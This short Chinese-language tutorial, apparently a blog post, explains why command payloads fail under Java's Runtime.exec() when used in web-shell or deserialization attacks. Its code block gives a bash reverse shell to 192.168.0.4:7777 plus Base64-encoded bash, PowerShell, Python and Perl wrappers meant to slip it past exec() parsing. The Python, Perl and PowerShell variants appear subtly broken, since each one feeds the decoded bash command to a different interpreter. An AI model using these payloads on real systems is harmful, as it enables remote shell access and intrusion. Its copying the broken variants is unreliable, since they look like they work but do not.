
有时，通过Runtime.getRuntime().exec()执行命令的有效负载有时会失败。

使用Web Shell，反序列化利用或通过其他媒介时，可能会发生这种情况。

有时这是因为重定向和管道字符的使用在启动过程的上下文中没有意义。

例如，在shell中执行ls> dir_listing会将当前目录的列表输出到名为dir_listing的文件中。但是在exec()函数的上下文中，该命令将被解释为获取>和dir_listing目录的列表。

有时，StringTokenizer类会破坏其中包含空格的参数，该类将命令字符串按空格分隔。像ls“我的目录”之类的东西将被解释为ls“我的目录”。

借助Base64编码，下面的转换器可以帮助减少这些问题。它可以通过调用Bash或PowerShell来制作管道并重新定向，还可以确保参数内没有空格。

原命令
```
bash -i >& /dev/tcp/192.168.0.4/7777 0>&1
```
编码后,中间的字符均为“base64”编码。
```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuNC83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}
#bash
 
powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc YgBhAHMAaAAgAC0AaQAgAD4AJgAgAC8AZABlAHYALwB0AGMAcAAvADEAOQAyAC4AMQA2ADgALgAwAC4ANAAvADcANwA3ADcAIAAwAD4AJgAxAA==
#powershell
 
python -c exec('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuNC83Nzc3IDA+JjE='.decode('base64'))
#python
 
perl -MMIME::Base64 -e eval(decode_base64('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuNC83Nzc3IDA+JjE='))
#perl
```